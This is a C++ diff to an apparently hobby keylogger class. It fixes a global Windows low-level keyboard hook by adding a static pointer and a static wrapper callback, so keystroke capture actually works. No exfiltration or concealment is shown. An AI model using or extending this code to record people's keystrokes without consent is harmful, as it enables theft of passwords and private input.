@@ -7,9 +7,13 @@
 #include "KeyLogger.h"
 #include <stdio.h>
 
+// Static member initialization
+KeyLogger *KeyLogger::objPointer = NULL;
+
 KeyLogger::KeyLogger(DataLog &newDataLog)
 {
      datalog = &newDataLog;
+     objPointer = this;
 }
 
 KeyLogger::KeyLogger(LogTypeName newLogType)
@@ -19,6 +23,8 @@ KeyLogger::KeyLogger(LogTypeName newLogType)
      datalog->log("\n\n------------------------------------------------------------------------");
      datalog->log("\n\t\t\t\tMyHook Session\t");
      datalog->log("------------------------------------------------------------------------\n");
+     
+     objPointer = this;
 }
 
 void KeyLogger::hookIt(void)
@@ -26,11 +32,8 @@ void KeyLogger::hookIt(void)
      // Retrieve the applications instance
     HINSTANCE appInstance = GetModuleHandle(NULL);
 
-    // Set a global Windows Hook to capture keystrokes.
-    
-    // DOES NOT WORK 5/1/09
-    // Need to figure out how to do callback with non-static method
-    SetWindowsHookEx( WH_KEYBOARD_LL, KeyLogger->LowLevelKeyboardProc, appInstance, 0 );
+    // Set a global Windows Hook to capture keystrokes. Callback to static wrapper for non-static function
+    SetWindowsHookEx( WH_KEYBOARD_LL, KeyLogger::LowLevelKeyboardProcWrapper, appInstance, 0 );
 
     MSG msg;
     while (GetMessage(&msg, NULL, 0, 0) > 0)
@@ -38,6 +41,11 @@ void KeyLogger::hookIt(void)
         TranslateMessage(&msg);
         DispatchMessage(&msg);
     }
+}
+
+LRESULT CALLBACK KeyLogger::LowLevelKeyboardProcWrapper( int nCode, WPARAM wParam, LPARAM lParam )
+{
+        return objPointer->LowLevelKeyboardProc(nCode, wParam, lParam);
 }
 
 LRESULT CALLBACK KeyLogger::LowLevelKeyboardProc( int nCode, WPARAM wParam, LPARAM lParam )
